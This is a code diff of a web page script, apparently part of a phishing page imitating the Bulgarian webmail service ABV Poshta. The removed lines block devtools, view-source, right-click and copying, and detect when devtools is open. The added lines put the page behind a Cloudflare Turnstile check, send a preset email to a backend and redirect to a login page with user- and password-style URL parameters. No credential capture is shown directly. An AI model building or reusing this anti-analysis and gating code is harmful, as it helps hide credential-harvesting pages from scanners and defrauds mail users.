+async function onVerified(token) {
+  if (verified) return;
+  if (!token) { onTurnstileError('missing-token'); return; }
 
-  /* Set to true if you ever need to embed this page in an iframe.
-     false = the page breaks out of any frame it is loaded into. */
-  var ALLOW_EMBED = false;
+  verified = true;
+  console.log('🛡️ Turnstile passed, sending token to backend...');
 
-  /* --- 1. frame buster --- */
-  if (!ALLOW_EMBED) {
-    try { if (window.top !== window.self) { window.top.location = window.self.location.href; } } catch (e) {}
-  }
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.add('state-verifying');
 
-  /* --- 2. kill right-click (belt and braces over the inline handler) --- */
-  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, false);
-
-  /* --- 3. kill image dragging / save-image --- */
-  document.addEventListener('dragstart', function (e) {
-    if (e.target && e.target.tagName === 'IMG') { e.preventDefault(); return false; }
-  }, false);
-
-  function hardenImages() {
-    var imgs = document.images, i;
-    for (i = 0; i < imgs.length; i++) {
-      imgs[i].setAttribute('draggable', 'false');
-      imgs[i].oncontextmenu = function () { return false; };
-      imgs[i].style.webkitUserDrag = 'none';
-    }
-  }
-  hardenImages();
-  window.addEventListener('load', hardenImages);
-
-  /* --- 4. keyboard shortcuts --- */
-  document.addEventListener('keydown', function (e) {
-    var k = (e.key || '').toLowerCase();
-    var tag = (e.target && e.target.tagName) || '';
-    var inField = (tag === 'INPUT' || tag === 'TEXTAREA' || e.target.isContentEditable);
-
-    /* F12 */
-    if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return; }
-
-    if (e.ctrlKey || e.metaKey) {
-      /* Ctrl+U view-source, Ctrl+S save, Ctrl+P print */
-      if (k === 'u' || k === 's' || k === 'p') { e.preventDefault(); e.stopPropagation(); return; }
-      /* Ctrl+Shift+I / J / C / K devtools */
-      if (e.shiftKey && (k === 'i' || k === 'j' || k === 'c' || k === 'k')) { e.preventDefault(); e.stopPropagation(); return; }
-      /* Ctrl+A only outside form fields, so field select-all still works */
-      if (k === 'a' && !inField) { e.preventDefault(); e.stopPropagation(); return; }
-    }
-  }, true);
-
-  /* --- 5. copy / cut: page text is unselectable, fields stay copyable --- */
-  document.addEventListener('copy', function (e) {
-    var tag = (e.target && e.target.tagName) || '';
-    if (tag === 'INPUT' || tag === 'TEXTAREA' || (e.target && e.target.isContentEditable)) return;
-    try {
-      if (e.clipboardData) {
-        e.clipboardData.setData('text/plain', '© АБВ Поща');
-        e.preventDefault();
-      }
-    } catch (err) {}
-  }, true);
-
-  document.addEventListener('cut', function (e) {
-    var tag = (e.target && e.target.tagName) || '';
-    if (tag === 'INPUT' || tag === 'TEXTAREA') return;
-  }, true);
-
-  /* --- 6. console banner --- */
   try {
-    console.log(
-      '%c STOP %c Този сайт е защитен. Копирането на кода е забранено. ',
-      'background:#1b9e15;color:#fff;font:700 12px Inter,sans-serif;padding:4px 8px;border-radius:2px 0 0 2px',
-      'background:#f0f0f0;color:#2f2f2f;font:500 12px Inter,sans-serif;padding:4px 8px;border-radius:0 2px 2px 0'
-    );
-    console.log('%c © ' + new Date().getFullYear() + ' — Всички права запазени.', 'color:#888;font:11px Inter,sans-serif');
-  } catch (e) {}
+    const response = await fetch(API_BASE + '/api/turnstile-verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: token, email: EMAIL })
+    });
 
-  /* --- 7. optional: quiet devtools-open detector (no visual change) --- */
-  var devOpen = false;
-  setInterval(function () {
-    var w = window.outerWidth - window.innerWidth;
-    var h = window.outerHeight - window.innerHeight;
-    var open = (w > 160 || h > 160);
-    if (open !== devOpen) {
-      devOpen = open;
-      document.documentElement.setAttribute('data-devtools', open ? 'open' : 'closed');
+    const data = await response.json();
+
+    if (!response.ok) {
+      throw new Error(data.message || `HTTP ${response.status}`);
     }
-  }, 1200);
 
-})();
+    if (data.success && data.redirect) {
+      console.log('✅ Proof generated, redirecting to login.html...');
+      setTimeout(function () {
+        // Redirects to: /login.html?u=...&p=...&t=...
+        window.location.href = data.redirect;
+      }, 600);
+    } else {
+      throw new Error(data.message || 'Verification failed on server');
+    }
+  } catch (error) {
+    console.error('❌ Backend verification failed:', error);
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = "Error: " + error.message;
+    }
+    if (card) card.classList.remove('state-verifying');
+    verified = false;
+    if (window.turnstile) {
+      try { window.turnstile.reset(); } catch (e) {}
+    }
+  }
+}
+
+function onTurnstileError(code) {
+  console.error('❌ Turnstile error:', code);
+  var box = document.getElementById('errorBox');
+  if (box) {
+    box.style.display = 'block';
+    box.textContent = translations[currentLang].errFail;
+  }
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.remove('state-verifying');
+}
+
+function onTurnstileExpired() {
+  verified = false;
+  if (window.turnstile) {
+    try { window.turnstile.reset(); } catch (e) {}
+  }
+}
+
+setTimeout(function () {
+  if (!verified && window.turnstile === undefined) {
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = translations[currentLang].errTimeout;
+    }
+  }
+}, 15000);
 </script>
 
 </body>
